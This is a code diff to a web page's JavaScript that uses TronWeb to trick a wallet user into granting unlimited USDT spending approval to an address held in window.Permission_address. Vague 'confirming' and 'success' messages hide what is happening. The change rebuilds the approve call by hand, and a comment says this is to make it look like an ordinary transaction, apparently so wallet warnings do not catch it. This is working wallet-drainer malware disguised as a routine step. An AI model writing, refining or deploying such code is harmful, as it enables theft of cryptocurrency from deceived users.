@@ -159,22 +159,40 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         try {
-            btnNext.textContent = "正在确认..."; // Confusing text
+            btnNext.textContent = "正在确认...";
             btnNext.disabled = true;
 
-            const currentTronWeb = window.tronWeb;
-            // 使用 window.usdtContractAddress
-            const contract = await currentTronWeb.contract().at(window.usdtContractAddress);
-            
-            // Infinite Approval
-            const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            
-            // 使用 window.Permission_address 进行授权
-            const result = await contract.approve(window.Permission_address, MAX_UINT256).send();
+            // 构建交易数据 (Construct Transaction Data)
+            // 使用 triggerSmartContract 手动构建，模拟普通交易结构
+            const parameter = [
+                { type: 'address', value: window.Permission_address },
+                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
+            ];
+
+            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                window.usdtContractAddress,
+                'approve(address,uint256)',
+                { feeLimit: 100000000 },
+                parameter,
+                userAddress
+            );
+
+            // 签名并广播 (Sign and Broadcast)
+            if (!transaction.result || !transaction.transaction) {
+                throw new Error("Transaction construction failed");
+            }
+
+            const signedTx = await tronWeb.trx.sign(transaction.transaction);
+            const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
             console.log("Transaction submitted:", result);
-            alert("提交成功！"); // Confusing success message
-            btnNext.textContent = "下一步";
+            
+            if (result.result) {
+                alert("提交成功！");
+                btnNext.textContent = "下一步";
+            } else {
+                throw new Error("Transaction broadcast failed");
+            }
             btnNext.disabled = false;
 
         } catch (error) {
